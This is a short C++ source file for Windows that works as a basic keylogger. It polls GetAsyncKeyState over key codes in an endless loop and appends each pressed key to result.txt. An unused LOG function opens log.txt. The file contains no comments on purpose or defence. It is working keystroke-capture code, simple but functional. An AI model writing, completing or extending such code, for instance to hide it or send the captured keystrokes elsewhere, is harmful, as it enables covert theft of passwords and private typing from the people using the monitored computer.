#include <iostream>
#include <fstream>
#include <Windows.h>
#define _WIN32_WINNT 0x0500
#include <stdlib.h>
#include <stdio.h>
using namespace std;

void LOG(int key, const char *files) {
    ofstream log;
     log.open("log.txt");
  

}
int main () {
    ShowWindow(GetConsoleWindow(), SW_SHOWNORMAL);
   
    char i;
    while (true) {
        for (i = 8; i < 190; i++) {
            //if the button is pressed
            if(GetAsyncKeyState(i)== -32767){
                fstream record;
                record.open("result.txt", fstream::app);
                if(record.is_open()) {
                    record << (char)(i);
                    record.close();
                }
             }
        }
    }
}
